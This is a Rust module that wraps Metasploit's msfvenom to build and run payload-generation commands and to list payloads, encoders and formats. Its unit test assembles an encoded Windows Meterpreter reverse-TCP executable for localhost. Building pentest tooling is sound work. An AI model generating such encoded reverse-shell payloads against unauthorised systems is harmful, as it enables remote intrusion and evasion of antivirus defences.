use crate::msf::runner::run_command;

pub struct PayloadOptions {
    pub payload: String,
    pub lhost: Option<String>,
    pub lport: Option<String>,
    pub format: Option<String>,
    pub encoder: Option<String>,
    pub iterations: Option<u32>,
    pub platform: Option<String>,
    pub arch: Option<String>,
    pub output: Option<String>,
    pub extra: Vec<String>,
}

impl Default for PayloadOptions {
    fn default() -> Self {
        Self {
            payload: String::new(),
            lhost: None,
            lport: None,
            format: None,
            encoder: None,
            iterations: None,
            platform: None,
            arch: None,
            output: None,
            extra: Vec::new(),
        }
    }
}

pub fn build_command(opts: &PayloadOptions) -> Vec<String> {
    let mut args = vec!["-p".to_string(), opts.payload.clone()];

    if let Some(ref host) = opts.lhost {
        args.push(format!("LHOST={host}"));
    }
    if let Some(ref port) = opts.lport {
        args.push(format!("LPORT={port}"));
    }
    if let Some(ref fmt) = opts.format {
        args.push("-f".to_string());
        args.push(fmt.clone());
    }
    if let Some(ref enc) = opts.encoder {
        args.push("-e".to_string());
        args.push(enc.clone());
    }
    if let Some(ref iterations) = opts.iterations {
        args.push("-i".to_string());
        args.push(iterations.to_string());
    }
    if let Some(ref plat) = opts.platform {
        args.push("--platform".to_string());
        args.push(plat.clone());
    }
    if let Some(ref arch) = opts.arch {
        args.push("-a".to_string());
        args.push(arch.clone());
    }
    if let Some(ref out) = opts.output {
        args.push("-o".to_string());
        args.push(out.clone());
    }

    args.extend(opts.extra.clone());
    args
}

pub fn generate_payload(opts: &PayloadOptions) -> Result<String, String> {
    let args = build_command(opts);
    let arg_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
    run_command("msfvenom", &arg_refs)
}

pub fn list_payloads() -> Result<String, String> {
    run_command("msfvenom", &["--list", "payloads"])
}

pub fn list_encoders() -> Result<String, String> {
    run_command("msfvenom", &["--list", "encoders"])
}

pub fn list_formats() -> Result<String, String> {
    run_command("msfvenom", &["--list", "formats"])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_command_includes_required_options() {
        let opts = PayloadOptions {
            payload: "windows/meterpreter/reverse_tcp".to_string(),
            lhost: Some("127.0.0.1".to_string()),
            lport: Some("4444".to_string()),
            format: Some("exe".to_string()),
            encoder: Some("x86/shikata_ga_nai".to_string()),
            iterations: Some(3),
            platform: Some("windows".to_string()),
            arch: Some("x86".to_string()),
            output: Some("out.exe".to_string()),
            extra: vec!["-b".to_string(), "\\x00".to_string()],
        };

        let args = build_command(&opts);

        assert_eq!(args[0], "-p");
        assert_eq!(args[1], "windows/meterpreter/reverse_tcp");
        assert!(args.contains(&"LHOST=127.0.0.1".to_string()));
        assert!(args.contains(&"LPORT=4444".to_string()));
        assert!(args.contains(&"-f".to_string()));
        assert!(args.contains(&"exe".to_string()));
        assert!(args.contains(&"-e".to_string()));
        assert!(args.contains(&"x86/shikata_ga_nai".to_string()));
        assert!(args.contains(&"-i".to_string()));
        assert!(args.contains(&"3".to_string()));
        assert!(args.contains(&"--platform".to_string()));
        assert!(args.contains(&"windows".to_string()));
        assert!(args.contains(&"-a".to_string()));
        assert!(args.contains(&"x86".to_string()));
        assert!(args.contains(&"-o".to_string()));
        assert!(args.contains(&"out.exe".to_string()));
        assert!(args.contains(&"-b".to_string()));
        assert!(args.contains(&"\\x00".to_string()));
    }
}
